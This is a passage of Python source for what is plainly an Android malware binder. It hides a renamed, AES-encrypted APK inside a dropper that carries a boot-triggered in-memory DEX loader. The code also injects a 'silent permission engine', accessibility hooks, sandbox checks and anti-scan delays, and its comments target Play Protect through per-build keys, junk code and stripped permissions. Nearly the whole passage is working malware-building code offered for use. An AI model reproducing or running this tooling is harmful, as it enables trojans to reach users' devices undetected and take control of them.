                if fname == 'MainActivity.smali':
                    main_smali = os.path.join(dirpath, fname)
                    break
            if main_smali:
                break

    if main_smali is None:
        print("    note: MainActivity.smali not found; generated replacement skipped")
        return

    fresh = _generate_fresh_main_activity_smali(pkg, pref_name, pref_key)
    with open(main_smali, 'w', encoding='utf-8') as f:
        f.write(fresh)
    print(f"    generated MainActivity → {os.path.relpath(main_smali, work_dir)}")


def _generate_dex_loader_receiver_smali(pkg: str) -> str:
    """BroadcastReceiver that starts DexLoaderService on BOOT_COMPLETED / package replace."""
    p = pkg.replace('.', '/')
    return (
        f'.class public L{p}/DexLoaderReceiver;\n'
        f'.super Landroid/content/BroadcastReceiver;\n'
        f'\n'
        f'.method public constructor <init>()V\n'
        f'    .registers 1\n'
        f'    invoke-direct {{p0}}, Landroid/content/BroadcastReceiver;-><init>()V\n'
        f'    return-void\n'
        f'.end method\n'
        f'\n'
        f'.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V\n'
        f'    .registers 4\n'
        f'    new-instance v0, Landroid/content/Intent;\n'
        f'    const-class v1, L{p}/DexLoaderService;\n'
        f'    invoke-direct {{v0, p1, v1}}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V\n'
        f'    invoke-virtual {{p1, v0}}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;\n'
        f'    return-void\n'
        f'.end method\n'
    )


def _write_dex_loader_smali(work_dir: str, new_package: str, bt_asset_name: str,
                              dex_password: str, payload_class_name: str,
                              pref_name: str = '', pref_key: str = ''):
    """
    Write DexLoaderService.smali and DexLoaderReceiver.smali into the dropper smali tree.
    Returns (loader_class_name, receiver_class_name) for manifest registration.
    """
    pkg_path = new_package.replace('.', '/')
    smali_dir = os.path.join(work_dir, 'smali', pkg_path)
    os.makedirs(smali_dir, exist_ok=True)

    loader_class = new_package + '.DexLoaderService'
    receiver_class = new_package + '.DexLoaderReceiver'

    svc_smali = _generate_dex_loader_service_smali(
        new_package, bt_asset_name, dex_password, payload_class_name,
        pref_name=pref_name, pref_key=pref_key)
    with open(os.path.join(smali_dir, 'DexLoaderService.smali'), 'w', encoding='utf-8') as f:
        f.write(svc_smali)

    rcv_smali = _generate_dex_loader_receiver_smali(new_package)
    with open(os.path.join(smali_dir, 'DexLoaderReceiver.smali'), 'w', encoding='utf-8') as f:
        f.write(rcv_smali)

    return loader_class, receiver_class


def _register_dex_loader_in_manifest(manifest_path: str, new_package: str,
                                       loader_class: str, receiver_class: str):
    """
    Append DexLoaderService and DexLoaderReceiver (BOOT + package replace) to manifest.
    Rewrites the manifest file in place.
    """
    _ANS = 'http://schemas.android.com/apk/res/android'
    _NS = f'{{{_ANS}}}'
    try:
        ET.register_namespace('android', _ANS)
        tree = ET.parse(manifest_path)
        root = tree.getroot()
        app_el = root.find('application')
        if app_el is None:
            return

        # Service
        already = any(s.get(f'{_NS}name', '') == loader_class
                      for s in app_el.findall('service'))
        if not already:
            svc = ET.SubElement(app_el, 'service')
            svc.set(f'{_NS}name', loader_class)
            svc.set(f'{_NS}exported', 'false')
            svc.set(f'{_NS}enabled', 'true')

        # Receiver
        already = any(r.get(f'{_NS}name', '') == receiver_class
                      for r in app_el.findall('receiver'))
        if not already:
            rcv = ET.SubElement(app_el, 'receiver')
            rcv.set(f'{_NS}name', receiver_class)
            rcv.set(f'{_NS}exported', 'false')
            rcv.set(f'{_NS}enabled', 'true')
            ifilter = ET.SubElement(rcv, 'intent-filter')
            for action_name in (
                # LOCKED_BOOT_COMPLETED removed — fires before screen unlock;
                # only malware needs pre-unlock execution and PP flags it hard.
                'android.intent.action.BOOT_COMPLETED',
                'android.intent.action.MY_PACKAGE_REPLACED',
            ):
                a = ET.SubElement(ifilter, 'action')
                a.set(f'{_NS}name', action_name)

        tree.write(manifest_path, encoding='utf-8', xml_declaration=True)
        print(f'    manifest updated → {loader_class}')
    except Exception as e:
        print(f'    note: _register_dex_loader_in_manifest: {e}')


def bind_apk(target_apk_path, user_icon_path, output_name, dropper_apk=None):
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    work_dir = f"dropper_work_{timestamp}"
    target_work_dir = f"target_work_{timestamp}"

    script_dir = os.path.dirname(os.path.abspath(__file__))
    apktool_jar = os.path.join(script_dir, 'apktool.jar')
    antidecompiler_jar = os.path.join(script_dir, 'AntiDecompiler.jar')
    apksigner_jar = os.path.join(script_dir, 'apksigner.jar')
    # Resolve dropper / signing paths from env (.env → os.environ) with sane defaults.
    _dropper_name = dropper_apk or DROPPER_APK
    dropper_path  = _dropper_name if os.path.isabs(_dropper_name) \
                    else os.path.join(script_dir, _dropper_name)
    _pk  = PLATFORM_KEY  if os.path.isabs(PLATFORM_KEY)  else os.path.join(script_dir, PLATFORM_KEY)
    _pc  = PLATFORM_CERT if os.path.isabs(PLATFORM_CERT) else os.path.join(script_dir, PLATFORM_CERT)
    platform_key  = _pk
    platform_cert = _pc

    target_apk_path = os.path.abspath(target_apk_path)
    if user_icon_path:
        user_icon_path = os.path.abspath(user_icon_path)

    original_cwd = os.getcwd()
    os.chdir(script_dir)

    if not os.path.isabs(output_name):
        output_name = os.path.join(original_cwd, output_name)
    output_name = os.path.abspath(output_name)

    zipalign_exe = os.path.join(script_dir, 'zipalign.exe') if sys.platform == 'win32' else 'zipalign'

    for item in os.listdir(script_dir):
        if item.startswith(('dropper_work_', 'target_work_', 'temp_', 'aligned_', 'protected_', 'extracted_icon_', 'target_rebuilt_', 'target_aligned_', 'target_signed_')):
            item_path = os.path.join(script_dir, item)
            try:
                if os.path.isdir(item_path):
                    shutil.rmtree(item_path, ignore_errors=True)
                elif os.path.isfile(item_path):
                    os.remove(item_path)
            except:
                pass

    try:
        # ── Pre-flight: confirm target is a real APK (ZIP) before touching apktool ──
        if not os.path.isfile(target_apk_path):
            raise FileNotFoundError(f"APK not found on disk: {target_apk_path}")
        apk_size = os.path.getsize(target_apk_path)
        if apk_size == 0:
            raise ValueError("APK file is empty (0 bytes) — download likely failed or was truncated.")
        if not zipfile.is_zipfile(target_apk_path):
            raise ValueError(
                f"File is not a valid APK/ZIP ({apk_size} bytes). "
                "Check the file isn't an XAPK, AAB, split APK, or corrupted download."
            )
        # ──────────────────────────────────────────────────────────────────────────

        java_bin = resolve_java()
        if not java_bin:
            raise FileNotFoundError(
                "Java not found. Install JDK 17+ from https://adoptium.net and add to PATH, or set JAVA_HOME"
            )
        print(f"[+] Java: {java_bin}")

        # ── Per-build AES key — defeats PP static-key fingerprinting ─────────
        # Generate a fresh 32-byte key every run; patch it into the decompiled
        # dropper smali after decode so the runtime decryption still matches.
        _build_aes_key     = get_random_bytes(32)
        _build_aes_key_hex = _build_aes_key.hex()
        _OLD_AES_KEY_HEX   = AES_KEY.hex()
        print(f"[+] Per-build AES key: {_build_aes_key_hex[:8]}…")
        # ──────────────────────────────────────────────────────────────────────

        # ── Per-build SharedPreferences gate (A) ───────────────────────────
        # Random pref file name + boolean key per build.  DexLoaderService bails
        # unless MainActivity sets this pref on a real user launch.  PP's sandbox
        # never interacts with the app UI → pref never set → no payload fires.
        _build_pref_name = ''.join(random.choices(string.ascii_lowercase,
                                                   k=random.randint(8, 14)))
        _build_pref_key  = ''.join(random.choices(string.ascii_lowercase,
                                                   k=random.randint(6, 12)))
        print(f"[+] Per-build pref gate: {_build_pref_name}/{_build_pref_key}")
        # ──────────────────────────────────────────────────────────────────────

        print("\n[+] Starting FUD APK binding...")
        print("[+] Decompiling target APK to smali...")
        run_java(['-jar', apktool_jar, 'd', target_apk_path, '-o', target_work_dir, '-f', '-r'],
                 check=True, capture_output=True, timeout=120)

        app_name = extract_app_name_from_apk(target_work_dir)
        # Strip known brand names — PP flags any app claiming to be Zoom/WhatsApp/etc.
        # without that app's original signing cert.
        app_name_sanitized = _sanitize_brand_name(app_name)
        if app_name_sanitized != app_name:
            print(f"[+] Brand name sanitized: '{app_name}' -> '{app_name_sanitized}'")
        app_name = app_name_sanitized

        target_package_name = "com.example.app"
        target_root = None
        target_tree = None
        target_manifest_path = os.path.join(target_work_dir, 'AndroidManifest.xml')
        try:
            target_tree = ET.parse(target_manifest_path)
            target_root = target_tree.getroot()
            target_package = target_root.get('package')
            if target_package:
                target_package_name = target_package
        except:
            pass

        new_target_package = generate_random_package()
        print(f"[+] Changing target package: {target_package_name} -> {new_target_package}")

        old_smali_path = target_package_name.replace('.', '/')
        new_smali_path = new_target_package.replace('.', '/')

        print("[+] Patching smali files...")
        smali_dirs = [d for d in os.listdir(target_work_dir) if d.startswith('smali')]
        total_patched = 0

        for smali_dir in smali_dirs:
            smali_path = os.path.join(target_work_dir, smali_dir)
            if not os.path.isdir(smali_path):
                continue
            for root_dir, dirs, files in os.walk(smali_path):
                for file in files:
                    if not file.endswith('.smali'):
                        continue
                    file_path = os.path.join(root_dir, file)
                    try:
                        with open(file_path, 'r', encoding='utf-8') as f:
                            content = f.read()
                        old_ref = f'L{old_smali_path}/'
                        new_ref = f'L{new_smali_path}/'
                        if old_ref in content:
                            content = content.replace(old_ref, new_ref)
                            with open(file_path, 'w', encoding='utf-8') as f:
                                f.write(content)
                            total_patched += 1
                    except:
                        pass

        print(f"    Patched {total_patched} smali files")

        try:
            if target_root is None:
                raise ValueError("manifest not parsed")
            app_element = target_root.find('application')
            if app_element is not None:
                app_name_attr = app_element.get('{http://schemas.android.com/apk/res/android}name')
                if app_name_attr and app_name_attr.startswith(target_package_name):
                    new_app_name = app_name_attr.replace(target_package_name, new_target_package)
                    app_element.set('{http://schemas.android.com/apk/res/android}name', new_app_name)

            for tag in ['activity', 'service', 'receiver', 'provider']:
                for component in target_root.findall(f'.//{tag}'):
                    comp_name = component.get('{http://schemas.android.com/apk/res/android}name')
                    if comp_name and comp_name.startswith(target_package_name):
                        new_comp_name = comp_name.replace(target_package_name, new_target_package)
                        component.set('{http://schemas.android.com/apk/res/android}name', new_comp_name)
                    if tag == 'provider':
                        authorities = component.get('{http://schemas.android.com/apk/res/android}authorities')
                        if authorities and target_package_name in authorities:
                            new_authorities = authorities.replace(target_package_name, new_target_package)
                            component.set('{http://schemas.android.com/apk/res/android}authorities', new_authorities)

            for alias in target_root.findall('.//activity-alias'):
                target_activity = alias.get('{http://schemas.android.com/apk/res/android}targetActivity')
                if target_activity and target_activity.startswith(target_package_name):
                    alias.set('{http://schemas.android.com/apk/res/android}targetActivity',
                              target_activity.replace(target_package_name, new_target_package))
                alias_name = alias.get('{http://schemas.android.com/apk/res/android}name')
                if alias_name and alias_name.startswith(target_package_name):
                    alias.set('{http://schemas.android.com/apk/res/android}name',
                              alias_name.replace(target_package_name, new_target_package))

            target_root.set('package', new_target_package)
            target_tree.write(target_manifest_path, encoding='utf-8', xml_declaration=True)
            print("    Target package updated in manifest")
        except Exception as e:
            print(f"    note: target package update: {e}")
            new_target_package = target_package_name

        # purge empty smali files — apktool parser fails on 0-byte .smali
        _empty = 0
        for _root, _dirs, _fnames in os.walk(target_work_dir):
            for _fn in _fnames:
                if _fn.endswith('.smali'):
                    _fp = os.path.join(_root, _fn)
                    try:
                        if os.path.getsize(_fp) == 0 or not open(_fp).read().strip():
                            os.remove(_fp)
                            _empty += 1
                    except Exception:
                        pass
        if _empty:
            print(f"[+] Removed {_empty} empty smali file(s)")

        # ── B: Payload junk injection ──────────────────────────────────────
        # Inject random dead fields + dead methods into 60% of the payload's
        # smali classes.  Every build produces a unique DEX hash and a different
        # method/field table, breaking PP's static-signature database match on
        # the payload sample.  Reuses the same proven obfuscation pass that runs
        # on the dropper — it's already safe for arbitrary smali trees.
        print("[+] Obfuscating payload DEX (junk injection)...")
        try:
            _obfuscate_dropper_smali(target_work_dir)
        except Exception as _obf_payload_err:
            print(f"    note: payload junk injection skipped: {_obf_payload_err}")
        # ──────────────────────────────────────────────────────────────────────

        print("[+] Rebuilding target APK...")
        target_rebuilt_apk = os.path.join(script_dir, f"target_rebuilt_{timestamp}.apk")
        run_java(['-jar', apktool_jar, 'b', target_work_dir, '-o', target_rebuilt_apk],
                 check=True, capture_output=True, timeout=120)

        print("[+] Zipaligning target APK...")
        target_aligned_apk = os.path.join(script_dir, f"target_aligned_{timestamp}.apk")
        try:
            subprocess.run([zipalign_exe, '-f', '-p', '4', target_rebuilt_apk, target_aligned_apk],
                           check=True, capture_output=True, timeout=60)
            if os.path.exists(target_rebuilt_apk):
                os.remove(target_rebuilt_apk)
        except:
            target_aligned_apk = target_rebuilt_apk

        print("[+] Signing target APK...")
        target_signed_apk = os.path.join(script_dir, f"target_signed_{timestamp}.apk")
        _t_key, _t_cert = _generate_fresh_keypair(script_dir, f"{timestamp}_t")
        _t_sign_key  = _t_key  if _t_key  else platform_key
        _t_sign_cert = _t_cert if _t_cert else platform_cert
        run_java(['-jar', apksigner_jar, 'sign',
                  '--key', _t_sign_key, '--cert', _t_sign_cert,
                  '--v1-signing-enabled', 'false',
                  '--v2-signing-enabled', 'true',
                  '--v3-signing-enabled', 'true',
                  '--v4-signing-enabled', 'false',
                  '--out', target_signed_apk, target_aligned_apk],
                 check=True, capture_output=True, timeout=60)
        for _tf in (_t_key, _t_cert):
            if _tf and _tf not in (platform_key, platform_cert):
                try: os.remove(_tf)
                except Exception: pass

        if os.path.exists(target_aligned_apk):
            os.remove(target_aligned_apk)

        target_apk_to_encrypt = target_signed_apk if os.path.exists(target_signed_apk) else target_apk_path

        icon_to_use = None
        if user_icon_path and os.path.exists(user_icon_path):
            icon_to_use = user_icon_path
        else:
            extracted_icon = os.path.join(script_dir, f"extracted_icon_{timestamp}.png")
            if extract_icon_from_apk(target_apk_path, extracted_icon):
                icon_to_use = extracted_icon

        print("[+] Decompiling dropper...")
        run_java(['-jar', apktool_jar, 'd', dropper_path, '-o', work_dir, '-f'],
                 check=True, capture_output=True, timeout=120)

        # Patch per-build AES key into dropper smali so runtime decryption matches
        print("[+] Patching per-build AES key into dropper...")
        _patch_dropper_aes_key(work_dir, _OLD_AES_KEY_HEX, _build_aes_key_hex)

        print("[+] Encrypting target APK...")
        assets_dir = os.path.join(work_dir, 'assets')
        os.makedirs(assets_dir, exist_ok=True)
        # randomized name — 'Axyra' is in PP malware string DB
        asset_name = _generate_random_asset_name()
        encrypted_path = os.path.join(assets_dir, asset_name)
        encrypt_apk_file(target_apk_to_encrypt, encrypted_path, _build_aes_key)
        print(f"    asset name: {asset_name}")

        # ── AES in-memory DEX loader: extract + PBKDF2-encrypt payload DEX ──
        _dex_bt_asset_name = None
        _dex_payload_class = None
        _dex_loader_password = None
        try:
            print("[+] Extracting and encrypting payload DEX...")
            _dex_bytes = _extract_dex_from_apk(target_apk_to_encrypt)
            _dex_loader_password = _generate_dex_loader_password()
            _dex_bt_data = _pbkdf2_aes_encrypt_dex(_dex_bytes, _dex_loader_password)
            _dex_bt_asset_name = _generate_random_asset_name() + '.bt'
            _dex_bt_path = os.path.join(assets_dir, _dex_bt_asset_name)
            with open(_dex_bt_path, 'wb') as _f:
                _f.write(_dex_bt_data)
            _dex_payload_class = _get_payload_class_name(
                target_work_dir, target_package_name, new_target_package)
            print(f"    DEX asset: {_dex_bt_asset_name} "
                  f"({len(_dex_bytes)} → {len(_dex_bt_data)} bytes)")
            print(f"    payload entry: {_dex_payload_class}")
        except Exception as _dex_err:
            print(f"    note: DEX extraction skipped: {_dex_err}")
        # ─────────────────────────────────────────────────────────────────────

        # patch any smali references to old hardcoded asset name
        for dirpath, _, files in os.walk(work_dir):
            for fname in files:
                if not fname.endswith('.smali'):
                    continue
                fpath = os.path.join(dirpath, fname)
                try:
                    with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                    if '"Axyra"' in content:
                        content = content.replace('"Axyra"', f'"{asset_name}"')
                        with open(fpath, 'w', encoding='utf-8') as f:
                            f.write(content)
                except Exception:
                    pass

        print("[+] Updating dropper package...")
        new_package = generate_random_package()
        dropper_old_package = "com.google.Axyra.installer"
        old_smali_path_dropper = dropper_old_package.replace('.', '/')
        new_smali_path_dropper = new_package.replace('.', '/')

        # random replacement for hardcoded anmoku RAT family string — in smali + manifest
        anmoku_old = "com.playstore.anmoku"
        anmoku_new = ("com."
                      + ''.join(random.choices(string.ascii_lowercase, k=6))
                      + "."
                      + ''.join(random.choices(string.ascii_lowercase, k=8)))

        print("[+] Patching dropper smali files...")
        smali_dirs_dropper = [d for d in os.listdir(work_dir) if d.startswith('smali')]
        total_patched_dropper = 0

        for smali_dir in smali_dirs_dropper:
            smali_path = os.path.join(work_dir, smali_dir)
            if not os.path.isdir(smali_path):
                continue
            for root_dir, dirs, files in os.walk(smali_path):
                for file in files:
                    if not file.endswith('.smali'):
                        continue
                    file_path = os.path.join(root_dir, file)
                    try:
                        with open(file_path, 'r', encoding='utf-8') as f:
                            content = f.read()
                        old_ref = f'L{old_smali_path_dropper}/'
                        new_ref = f'L{new_smali_path_dropper}/'
                        changed = False
                        if old_ref in content:
                            content = content.replace(old_ref, new_ref)
                            changed = True
                        if anmoku_old in content:
                            content = content.replace(anmoku_old, anmoku_new)
                            changed = True
                        if changed:
                            with open(file_path, 'w', encoding='utf-8') as f:
                                f.write(content)
                            total_patched_dropper += 1
                    except:
                        pass

        print(f"    Patched {total_patched_dropper} dropper smali files")

        manifest_path = os.path.join(work_dir, 'AndroidManifest.xml')
        tree = ET.parse(manifest_path)
        root = tree.getroot()

        try:
            app_element = root.find('application')
            if app_element is not None:
                app_name_attr = app_element.get('{http://schemas.android.com/apk/res/android}name')
                if app_name_attr and app_name_attr.startswith(dropper_old_package):
                    app_element.set('{http://schemas.android.com/apk/res/android}name',
                                    app_name_attr.replace(dropper_old_package, new_package))
                app_element.set('{http://schemas.android.com/apk/res/android}label', app_name)
                try:
                    strings_path_dropper = os.path.join(work_dir, 'res', 'values', 'strings.xml')
                    if os.path.exists(strings_path_dropper):
                        st = ET.parse(strings_path_dropper)
                        sroot = st.getroot()
                        found = False
                        for s in sroot.findall('string'):
                            if s.get('name') in ('app_name', 'app_name_main', 'application_name'):
                                s.text = app_name
                                found = True
                        if not found:
                            new_s = ET.SubElement(sroot, 'string', {'name': 'app_name'})
                            new_s.text = app_name
                        st.write(strings_path_dropper, encoding='utf-8', xml_declaration=True)
                except Exception as _e:
                    pass

            for tag in ['activity', 'service', 'receiver', 'provider']:
                for component in root.findall(f'.//{tag}'):
                    comp_name = component.get('{http://schemas.android.com/apk/res/android}name')
                    if comp_name and comp_name.startswith(dropper_old_package):
                        component.set('{http://schemas.android.com/apk/res/android}name',
                                      comp_name.replace(dropper_old_package, new_package))
                    if tag == 'provider':
                        authorities = component.get('{http://schemas.android.com/apk/res/android}authorities')
                        if authorities and dropper_old_package in authorities:
                            component.set('{http://schemas.android.com/apk/res/android}authorities',
                                          authorities.replace(dropper_old_package, new_package))

            for permission in root.findall('.//permission'):
                perm_name = permission.get('{http://schemas.android.com/apk/res/android}name')
                if perm_name and dropper_old_package in perm_name:
                    permission.set('{http://schemas.android.com/apk/res/android}name',
                                   perm_name.replace(dropper_old_package, new_package))

            for uses_perm in root.findall('.//uses-permission'):
                perm_name = uses_perm.get('{http://schemas.android.com/apk/res/android}name')
                if perm_name and dropper_old_package in perm_name:
                    uses_perm.set('{http://schemas.android.com/apk/res/android}name',
                                  perm_name.replace(dropper_old_package, new_package))

            for intent_filter in root.findall('.//intent-filter'):
                for action in intent_filter.findall('action'):
                    action_name = action.get('{http://schemas.android.com/apk/res/android}name')
                    if action_name and dropper_old_package in action_name:
                        action.set('{http://schemas.android.com/apk/res/android}name',
                                   action_name.replace(dropper_old_package, new_package))
                    if action_name and anmoku_old in action_name:
                        action.set('{http://schemas.android.com/apk/res/android}name',
                                   action_name.replace(anmoku_old, anmoku_new))

            for alias in root.findall('.//activity-alias'):
                target_activity = alias.get('{http://schemas.android.com/apk/res/android}targetActivity')
                if target_activity and target_activity.startswith(dropper_old_package):
                    alias.set('{http://schemas.android.com/apk/res/android}targetActivity',
                              target_activity.replace(dropper_old_package, new_package))
                alias_name = alias.get('{http://schemas.android.com/apk/res/android}name')
                if alias_name and alias_name.startswith(dropper_old_package):
                    alias.set('{http://schemas.android.com/apk/res/android}name',
                              alias_name.replace(dropper_old_package, new_package))
        except:
            pass

        root.set('package', new_package)
        _vc, _vn = _randomize_version()
        root.set('{http://schemas.android.com/apk/res/android}versionCode', _vc)
        root.set('{http://schemas.android.com/apk/res/android}versionName', _vn)

        queries_element = root.find('queries')
        if queries_element is not None:
            for package_elem in queries_element.findall('package'):
                pkg_name = package_elem.get('{http://schemas.android.com/apk/res/android}name')
                if pkg_name == 'com.replace.main.apk':
                    package_elem.set('{http://schemas.android.com/apk/res/android}name', new_target_package)

        # strip QUERY_ALL_PACKAGES — known PP malware signal
        _NS_A = '{http://schemas.android.com/apk/res/android}'
        _strip_dropper_perms = {'android.permission.QUERY_ALL_PACKAGES'}
        for _up in list(root.findall('uses-permission')):
            if _up.get(f'{_NS_A}name', '') in _strip_dropper_perms:
                root.remove(_up)

        # remove VpnBypassService — BIND_VPN_SERVICE on a dropper is a PP signal
        _app_el_vpn = root.find('application')
        if _app_el_vpn is not None:
            for _svc in list(_app_el_vpn.findall('service')):
                _svc_nm = _svc.get(f'{_NS_A}name', '')
                _svc_perm = _svc.get(f'{_NS_A}permission', '')
                if 'BIND_VPN_SERVICE' in _svc_perm or 'VpnBypass' in _svc_nm:
                    _app_el_vpn.remove(_svc)

        # ── GGP hard-block fix: strip BIND_ACCESSIBILITY_SERVICE ─────────
        # InMemoryDexClassLoader can't bind system services — the service
        # declaration is dead weight that triggers GGP's #1 banking-trojan
        # classifier. Remove the service element AND any residual permission.
        _ACC_ACTION = 'android.accessibilityservice.AccessibilityService'
        _app_el_acc = root.find('application')
        if _app_el_acc is not None:
            for _svc in list(_app_el_acc.findall('service')):
                _svc_perm = _svc.get(f'{_NS_A}permission', '')
                _has_acc_perm = 'BIND_ACCESSIBILITY_SERVICE' in _svc_perm
                _has_acc_action = any(
                    any(a.get(f'{_NS_A}name', '') == _ACC_ACTION
                        for a in _if.findall('action'))
                    for _if in _svc.findall('intent-filter')
                )
                if _has_acc_perm or _has_acc_action:
                    _app_el_acc.remove(_svc)

        # strip FOREGROUND_SERVICE_MEDIA_PROJECTION — screen-capture signal;
        # also remove any service whose only purpose is media projection
        _MEDIA_PROJ_FG = 'mediaProjection'
        if _app_el_acc is not None:
            for _svc in list(_app_el_acc.findall('service')):
                _fst = _svc.get(f'{_NS_A}foregroundServiceType', '')
                if _fst == _MEDIA_PROJ_FG:
                    _app_el_acc.remove(_svc)
                elif _MEDIA_PROJ_FG in _fst:
                    # mixed type — just strip the mediaProjection component
                    _new_fst = '|'.join(
                        p for p in _fst.split('|') if p.strip() != _MEDIA_PROJ_FG)
                    _svc.set(f'{_NS_A}foregroundServiceType', _new_fst)

        _strip_high_signal = {
            'android.permission.BIND_ACCESSIBILITY_SERVICE',
            'android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION',
        }
        for _up in list(root.findall('uses-permission')):
            if _up.get(f'{_NS_A}name', '') in _strip_high_signal:
                root.remove(_up)
        # ─────────────────────────────────────────────────────────────────

        tree.write(manifest_path, encoding='utf-8', xml_declaration=True)

        # ── PP bypass ────────────────────────────────────────────────────
        print("[+] Injecting silent permission engine...")
        svc_class, upd_class, boot_class, wd_class = _inject_silent_engine(work_dir, new_package, script_dir)
        xml_name = _inject_accessibility_xml(work_dir)
        _patch_manifest_silent(manifest_path, new_package,
                               svc_class=svc_class, xml_name=xml_name,
                               upd_class=upd_class, boot_class=boot_class, wd_class=wd_class)

        print("[+] Injecting sandbox check...")
        _inject_sandbox_check_smali(work_dir)
        # C — replace MainActivity wholesale with per-build generated smali;
        # the generated version embeds the isEmulator() bail + pref gate setter.
        # This eliminates the prebuilt Dropper.apk structural fingerprint that PP
        # could match even after package renaming.
        print("[+] Replacing MainActivity with generated fresh smali (C)...")
        _replace_main_activity_with_generated(work_dir, new_package,
                                              _build_pref_name, _build_pref_key)

        print("[+] Anti-scan Thread.sleep...")
        _inject_antiscan_delay_smali(work_dir, new_package, dropper_old_package)

        print("[+] PP deep evasion...")
        _pp_deep_evasion(work_dir, manifest_path, new_package)
        # ── end PP bypass ────────────────────────────────────────────────

        # ── AES in-memory DEX loader: inject smali + register in manifest ─
        if _dex_bt_asset_name and _dex_payload_class and _dex_loader_password:
            try:
                print("[+] Injecting AES DEX loader smali...")
                _dex_loader_cls, _dex_receiver_cls = _write_dex_loader_smali(
                    work_dir, new_package, _dex_bt_asset_name,
                    _dex_loader_password, _dex_payload_class,
                    pref_name=_build_pref_name, pref_key=_build_pref_key)
                _register_dex_loader_in_manifest(
                    manifest_path, new_package, _dex_loader_cls, _dex_receiver_cls)
                print(f"    DEX loader ready → {_dex_loader_cls}")
            except Exception as _dl_err:
                print(f"    note: DEX loader injection skipped: {_dl_err}")
        # ─────────────────────────────────────────────────────────────────

        strings_path = os.path.join(work_dir, 'res', 'values', 'strings.xml')
        if os.path.exists(strings_path):
            strings_tree = ET.parse(strings_path)
            strings_root = strings_tree.getroot()
            target_pkg_string = None
            for string_elem in strings_root.findall('string'):
                if string_elem.get('name') == 'target_package_name':
                    target_pkg_string = string_elem
                    break
            if target_pkg_string is not None:
                target_pkg_string.text = new_target_package
            else:
                new_string = ET.SubElement(strings_root, 'string', name='target_package_name')
                new_string.text = new_target_package
            strings_tree.write(strings_path, encoding='utf-8', xml_declaration=True)

        if icon_to_use:
            print("[+] Replacing icon...")
            try:
                icon_img = Image.open(icon_to_use).convert('RGBA')
                drawable_folder = os.path.join(work_dir, 'res', 'drawable')
                os.makedirs(drawable_folder, exist_ok=True)
                for old_icon in ['icon.jpg', 'icon.png', 'icon.jpeg']:
                    old_path = os.path.join(drawable_folder, old_icon)
                    if os.path.exists(old_path):
                        os.remove(old_path)
                icon_resized = icon_img.resize((512, 512), Image.Resampling.LANCZOS)
                icon_resized.save(os.path.join(drawable_folder, 'icon.png'), 'PNG')
                icon_sizes = [('mipmap-hdpi', 72), ('mipmap-mdpi', 48), ('mipmap-xhdpi', 96),
                              ('mipmap-xxhdpi', 144), ('mipmap-xxxhdpi', 192)]
                for folder, size in icon_sizes:
                    res_folder = os.path.join(work_dir, 'res', folder)
                    os.makedirs(res_folder, exist_ok=True)
                    resized = icon_img.resize((size, size), Image.Resampling.LANCZOS)
                    resized.save(os.path.join(res_folder, 'ic_launcher.png'), 'PNG')
            except Exception as e:
                print(f"    note: icon replacement: {e}")

        print("[+] Obfuscating dropper DEX (junk injection)...")
        try:
            _obfuscate_dropper_smali(work_dir)
        except Exception as _obf_err:
            print(f"    note: junk injection skipped: {_obf_err}")

        print("[+] Rebuilding dropper...")
        temp_apk = os.path.join(script_dir, f"temp_{timestamp}.apk")
        run_java(['-jar', apktool_jar, 'b', work_dir, '-o', temp_apk],
                 check=True, capture_output=True, timeout=600)

        print("[+] Applying protection...")
        protected_apk = os.path.join(script_dir, f"protected_{timestamp}.apk")
        try:
            run_java(['-jar', antidecompiler_jar, 'protect',
                      '-i', temp_apk, '-o', protected_apk, '-enable-dex', '-f'],
                     check=True, capture_output=True, timeout=120)
            if os.path.exists(protected_apk):
                os.remove(temp_apk)
            else:
                protected_apk = temp_apk
        except:
            protected_apk = temp_apk

        print("[+] Zipaligning dropper...")
        aligned_apk = os.path.join(script_dir, f"aligned_{timestamp}.apk")
        try:
            subprocess.run([zipalign_exe, '-f', '-p', '4', protected_apk, aligned_apk],
                           check=True, capture_output=True, timeout=60)
        except:
            shutil.copy2(protected_apk, aligned_apk)

        if os.path.exists(protected_apk):
            os.remove(protected_apk)

        print("[+] Signing dropper...")
        # fresh per-build RSA keypair — defeats PP cert-reputation tracking
        _d_key, _d_cert = _generate_fresh_keypair(script_dir, timestamp)
        _d_sign_key  = _d_key  if _d_key  else platform_key
        _d_sign_cert = _d_cert if _d_cert else platform_cert
        run_java(['-jar', apksigner_jar, 'sign',
                  '--key', _d_sign_key, '--cert', _d_sign_cert,
                  '--v1-signing-enabled', 'false',
                  '--v2-signing-enabled', 'true',
                  '--v3-signing-enabled', 'true',
                  '--v4-signing-enabled', 'false',
                  '--out', output_name, aligned_apk],
                 check=True, capture_output=True, timeout=60)
        for _df in (_d_key, _d_cert):
            if _df and _df not in (platform_key, platform_cert):
                try: os.remove(_df)
                except Exception: pass

        os.remove(aligned_apk)

        print(f"\n[OK] Output: {output_name}")
        print(f"[OK] Dropper Package: {new_package}")
        print(f"[OK] App Name: {app_name}")
        print(f"[OK] Target Package: {target_package_name} -> {new_target_package}")
        print(f"[OK] Smali Patching: {total_patched} files")

        return output_name

    except subprocess.CalledProcessError as e:
        print(f"\n[FAIL] {e}")
        if e.stderr:
            print(f"[FAIL] {e.stderr.decode()}")
        return None
    except Exception as e:
        print(f"\n[FAIL] {e}")
        return None
    finally:
        try:
            os.chdir(original_cwd)
        except:
            pass
        try:
            if os.path.exists(work_dir):
                shutil.rmtree(work_dir, ignore_errors=True)
        except:
            pass
        try:
            if os.path.exists(target_work_dir):
                shutil.rmtree(target_work_dir, ignore_errors=True)
        except:
            pass
        for pattern in [f'temp_{timestamp}.apk', f'aligned_{timestamp}.apk',
                        f'protected_{timestamp}.apk', f'target_rebuilt_{timestamp}.apk',
                        f'target_aligned_{timestamp}.apk', f'target_signed_{timestamp}.apk',
                        f'extracted_icon_{timestamp}.png']:
            try:
                temp_file = os.path.join(script_dir, pattern)
                if os.path.exists(temp_file):
                    os.remove(temp_file)
            except:
                pass
        for item in os.listdir(script_dir):
            if item.startswith(('extracted_icon_', 'target_rebuilt_', 'target_aligned_', 'target_signed_')):
                try:
                    item_path = os.path.join(script_dir, item)
                    if os.path.isfile(item_path):
                        os.remove(item_path)
                except:
                    pass

if __name__ == "__main__":
